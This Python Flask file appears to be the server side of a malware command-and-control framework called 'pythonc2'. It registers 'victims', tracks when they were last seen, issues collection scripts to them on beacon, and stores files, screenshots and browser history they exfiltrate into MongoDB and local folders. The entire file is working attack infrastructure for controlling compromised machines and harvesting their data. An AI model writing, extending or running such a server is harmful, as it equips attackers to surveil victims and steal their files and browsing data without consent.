from flask import Flask,request
from pathlib import Path
import  os
import pymongo
import logging
import pdb
import base64
import datetime
import pdb
import time


def main(myclient):
	app = Flask('app')

	## Get the cookie/victim ID from a request
	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False

	## Updates last seen whenever a new request is seen from the victim
	def update_last_seen(mydb,victim_id):
		victims = mydb["victims"]
		h = {'id':victim_id}
		victims.find_one_and_update(h,{ "$set": { "lastseen": datetime.datetime.now() } })


	def get_victim_info(request):
		return request.form.to_dict()


	## Handles/sends the commands issued by the server
	def handle_commands(cmd_object):
		cmd = cmd_object['command']
		task_id = cmd_object['task_id']

		language = 'python'
		utility = 'collection'

		## Send command script to victim
		if language == 'python':
			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".py")
		else:
			module_path = os.path.join(os.getcwd(), "modules",language,utility,cmd+".ps1")

		f = open(module_path, "r")
		script = f.read()
		return {'task_id': task_id, 'language': language, 'cmd': cmd, 'script': script}
	
	## Insert the command output in the Database
	def insert_cmd_output(output,victim_id,task_id):
		mydb = myclient["pythonc2"]
		cmds = mydb["commands"]
		h = {'victim_id':victim_id,'task_id':task_id}
		cmds.find_one_and_update(h,{ "$set": { "output": output } })



	####################################### General beacon and sends task  ####################################

	@app.route('/',methods = ['GET', 'POST'])
	def run():
		if request.method == 'GET':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			
			victim_id = get_cookie(request)

			## Update last seen
			if victim_id:
				update_last_seen(mydb,victim_id)

			## Finding only the commands for this victim id and which hasn't been issued yet
			x = cmds.find({'victim_id': victim_id, 'issued':False})


			## Issue the command present in the database
			for cmd in x:
				script = handle_commands(cmd)
				h = {'victim_id':cmd['victim_id'],'task_id':cmd['task_id']}
				cmds.find_one_and_update(h,{ "$set": { "issued": True } })
				return script

			## Default reply of server incase no commands
			return 'Nothing Fishy going on here :)'

		## Not needed remove.
		if request.method == 'POST':

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	####################################### Task output handler  ####################################

	@app.route('/<cmd>/output/<task_id>',methods = ['POST'])


	def task_output(cmd,task_id):
		if request.method == 'POST':
			victim_id = get_cookie(request)

			## Handling for various kind of tasks
			if cmd == 'screenshot':

				## Dumping path
				dump_path = os.path.join(os.getcwd(),'victim_data',victim_id)
				if not os.path.exists(dump_path):
					os.makedirs(dump_path)
				ss_path = os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png")

				## Screenshot is base64 encoded
				b64encoded_string = request.data
				decoded_string = base64.b64decode(b64encoded_string)
				


				## Dump the screenshot
				with open(ss_path, "wb") as f:
					f.write(decoded_string)
				f.close()

				output = 'Screeshot saved to '+ss_path
			elif cmd == 'browser_history':

				## Comes as a bytes object, so changing to string
				output = request.data.decode('utf-8')
			else:
				## Not a valid cmd,, Do something?? TODO
				pass
			
			insert_cmd_output(output,victim_id,task_id)

			return "OK"

		
	####################################### Staging / Initial request from the victim  ####################################

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]

			victim_id = get_cookie(request)
			victims = mydb['victims']
			info = get_victim_info(request)

		if victim_id:

			## Add the id and the OS info sent by victim
			h = {'id':victim_id}
			h.update(info)

			## Make sure victim ID doesn't exists
			if not victims.find_one(h):

				## Add the last name and insert to DB
				h['lastseen'] = datetime.datetime.now()
				victims.insert_one(h)
				
				return ('Victim registered', 200)
			else:
				return ('Victim already registered', 302)

		return ('Bad request', 400)

	app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
	main(myclient)